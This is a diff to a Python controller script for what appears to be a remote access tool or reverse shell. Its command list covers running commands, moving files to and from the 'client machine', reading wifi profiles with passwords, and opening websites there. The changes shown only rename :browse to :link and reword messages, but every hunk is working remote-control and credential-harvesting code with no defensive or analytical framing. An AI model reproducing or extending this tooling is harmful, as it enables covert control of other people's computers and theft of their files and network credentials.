@@ -33,7 +33,7 @@ Commands      Desscription
 :exec         Run external command
 :check        Check if client machine is connected to internet
 :wifi         Show Client machine wifi info [names,passwod,etc]
-:browse       Open an website on client machine browser
+:link       Open an website on client machine browser
 pwd           Print working directory in client machine
 cd -          Switch back to previous directory in client machine
 cd --         Switch back to first directory when connection was established with client machine
@@ -54,13 +54,13 @@ def download(filee):
       elif data == b":Aborted:":
         wf.close()
         os.remove(filetodown)
-        print("[!] Downloading Has Aborted By Client!")
+        print("[!] Downloading Has Canceled By Target!")
         return
       wf.write(data)
      wf.close()
      print("[*] Download Complete :)\n[*] file Saved In : {}\n".format(os.getcwd()+os.sep+filetodown))
    else: print(down)
-  else: print("Usage: :download <file_to_download_from_client_machine>\n")
+  else: print("Usage: :download <download_a_file_from_client_machine>\n")
 def upload(cmd):
     filetoup = "".join(cmd.split(":upload")).strip()
     if not filetoup.strip(): print("usage: :upload <file_to_upload>\n")
@@ -75,7 +75,7 @@ def upload(cmd):
               except(KeyboardInterrupt,EOFError):
                 wf.close()
                 controler.send(b":Aborted:")
-                print("[!] Uploading Has Been Aborted By User!\n")
+                print("[!] Uploading Has Been Canceled By User!\n")
                 return
           controler.send(b":DONE:")
           savedpath = controler.recv().decode("UTF-8")
@@ -88,13 +88,13 @@ def check_con():
      if status == "UP": print("[*] client: Connected to internet !\n")
      else: print("[!] client: Not Connected to internet !\n")
 
-def browse(cmd):
-  url = "".join(cmd.split(":browse")).strip()
-  if not url.strip(): print("Usage: :browse <Websute_URL>\n")
+def link(cmd):
+  url = "".join(cmd.split(":link")).strip()
+  if not url.strip(): print("Usage: :link <Websute_URL>\n")
   else:
     if not url.startswith(("http://","https://")): url = "http://"+url
     print("[~] Opening [ {} ]...".format(url))
-    controler.send(":browse {}".format(url).encode("UTF-8"))
+    controler.send(":link {}".format(url).encode("UTF-8"))
     print("[*] Done \n")
 
 def control():
@@ -129,20 +129,20 @@ def control():
         check_con()
         control()
       elif cmd == ":wifi":
-        print("[*] Geting Wifi profiles info...")
+        print("[*] Getting Wifi profiles info...")
         controler.send(b":wifi")
         info = controler.recv()
         try:
           info = info.decode("UTF-8","ignore")
         except  UnicodeEncodeError: info = info
         finally:
-           if info==":osnot:": print("[!] Sorry, i can't found wifi info of client machine!\n")
+           if info==":osnot:": print("[!] Faild To Get Wifi Info!\n")
            else:
              print("[*] INFO:\n")
              print(info + "\n")
              control()
-      elif ":browse" in cmd:
-        browse(cmd)
+      elif ":link" in cmd:
+        link(cmd)
         control()
       elif cmd.lower() == "cls" or cmd == "clear":
              os.system("cls||clear")
@@ -155,7 +155,7 @@ def control():
            print(" ")
            control()
     except socket.error:
-       print("[!] Connection Lost to: "+a[0]+" !")
+       print("[!] The Connection Is Lost: "+a[0]+" !")
        c.close()
        s.close()
        exit(1)
@@ -164,7 +164,7 @@ def control():
         print(" ")
         control()
     except Exception as e:
-       print("[!] An error occurred: "+str(e)+"\n")
+       print("[!] There Is An Error : "+str(e)+"\n")
        control()
 
 def server(IP,PORT,senrev=senrev):
